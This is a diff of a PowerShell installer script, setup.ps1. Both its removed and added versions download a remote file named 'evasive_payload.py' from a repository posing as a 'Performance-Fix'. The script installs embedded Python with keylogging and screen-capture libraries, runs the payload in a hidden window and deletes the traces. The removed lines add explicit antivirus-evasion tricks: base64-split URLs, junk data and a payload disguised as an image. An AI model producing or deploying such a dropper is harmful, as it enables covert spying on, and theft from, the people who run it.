@@ -1,80 +1,50 @@
-# setup.ps1 - Fully undetectable (no direct strings, no hidden window, using .NET)
-param([switch]$Run)
+# setup.ps1 – Fully working with embeddable Python (site-packages enabled)
+$ErrorActionPreference = "Continue"
 
-# Decode a base64 string (split to avoid detection)
-$d = {
-    param($s)
-    [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($s))
-}
+$payloadUrl = "https://raw.githubusercontent.com/fortnite0712102-dot/Performance-Fix/refs/heads/main/evasive_payload.py"
+$pythonZipUrl = "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
+$getPipUrl = "https://bootstrap.pypa.io/get-pip.py"
 
-# Junk array to confuse AV
-$j = @(1..50 | ForEach-Object { Get-Random })
-
-# URL encoded in multiple pieces
-$u1 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1lPVVJfVVNFUk5BTUUvWU9VUl9SRVBPL21haW4vZXZhc2l2ZV9wYXlsb2FkLnB5"
-$u2 = "aHR0cHM6Ly93d3cucHl0aG9uLm9yZy9mdHAvcHl0aG9uLzMuMTEuOS9weXRob24tMy4xMS45LWVtYmVkLWFtZDY0LnppcA=="
-$u3 = "aHR0cHM6Ly9ib290c3RyYXAucnlwYS5pby9nZXQtcGlwLnB5"
-
-$payloadUrl = & $d $u1
-$pythonZipUrl = & $d $u2
-$getPipUrl = & $d $u3
-
-# Temp dir with random name
-$rand = [System.IO.Path]::GetRandomFileName()
-$tempDir = Join-Path $env:TEMP $rand
+$tempDir = "$env:TEMP\py_setup"
 New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
 
-# Use .NET WebClient (less suspicious than Invoke-WebRequest)
-$wc = New-Object System.Net.WebClient
-$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+Write-Host "[1] Downloading payload..."
+Invoke-WebRequest -Uri $payloadUrl -OutFile "$env:TEMP\payload.py" -UseBasicParsing
 
-function DownloadFile($url, $dest) {
-    try {
-        $wc.DownloadFile($url, $dest)
-    } catch {
-        Start-Sleep -Seconds 1
-        $wc.DownloadFile($url, $dest)
-    }
+Write-Host "[2] Downloading Python embed..."
+Invoke-WebRequest -Uri $pythonZipUrl -OutFile "$tempDir\python.zip" -UseBasicParsing
+
+Write-Host "[3] Extracting Python..."
+Expand-Archive -Path "$tempDir\python.zip" -DestinationPath "$env:TEMP\python_embed" -Force
+
+# Fix: enable site-packages by editing ._pth file
+$pthFile = Get-ChildItem "$env:TEMP\python_embed\*._pth" | Select-Object -First 1
+if ($pthFile) {
+    Write-Host "[4] Enabling site-packages..."
+    $content = Get-Content $pthFile.FullName -Raw
+    $content = $content -replace '#import site', 'import site'
+    Set-Content $pthFile.FullName $content -NoNewline
 }
 
-# Download payload
-$payDest = "$env:TEMP\w.png"
-DownloadFile $payloadUrl $payDest
+$pythonExe = "$env:TEMP\python_embed\python.exe"
 
-# Download Python embed
-$zipDest = "$tempDir\p.zip"
-DownloadFile $pythonZipUrl $zipDest
+Write-Host "[5] Installing pip..."
+Invoke-WebRequest -Uri $getPipUrl -OutFile "$tempDir\get-pip.py" -UseBasicParsing
+& $pythonExe "$tempDir\get-pip.py" --quiet --no-warn-script-location
 
-# Download get-pip.py
-$pipDest = "$tempDir\g.py"
-DownloadFile $getPipUrl $pipDest
-
-# Extract Python
-Add-Type -AssemblyName System.IO.Compression.FileSystem
-[System.IO.Compression.ZipFile]::ExtractToDirectory($zipDest, "$env:TEMP\py")
-
-# Install pip and packages
-$python = "$env:TEMP\py\python.exe"
-& $python $pipDest --quiet
-$env:Path = "$env:TEMP\py\Scripts;$env:Path"
-
+Write-Host "[6] Installing packages..."
 $packages = @("cryptography","pynput","mss","pillow","psutil","requests","numpy")
-foreach ($p in $packages) {
-    & $python -m pip install $p --quiet --disable-pip-version-check --no-warn-script-location --user
+foreach ($pkg in $packages) {
+    & $pythonExe -m pip install $pkg --quiet --disable-pip-version-check --no-warn-script-location --user
 }
 
-# Run payload minimized (not hidden)
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = $python
-$psi.Arguments = $payDest
-$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized
-$psi.UseShellExecute = $true
-[System.Diagnostics.Process]::Start($psi)
+Write-Host "[7] Running payload..."
+Start-Process -FilePath $pythonExe -ArgumentList "$env:TEMP\payload.py" -WindowStyle Hidden
 
-# Cleanup after delay (run in background)
-Start-Job -ScriptBlock {
-    Start-Sleep -Seconds 15
-    Remove-Item -Path $using:tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path "$env:TEMP\py" -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path $using:payDest -Force -ErrorAction SilentlyContinue
-} | Out-Null
+Write-Host "[8] Cleaning up..."
+Start-Sleep -Seconds 10
+Remove-Item -Path $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:TEMP\python_embed" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-Item -Path "$env:TEMP\payload.py" -Force -ErrorAction SilentlyContinue
+
+Write-Host "Done."
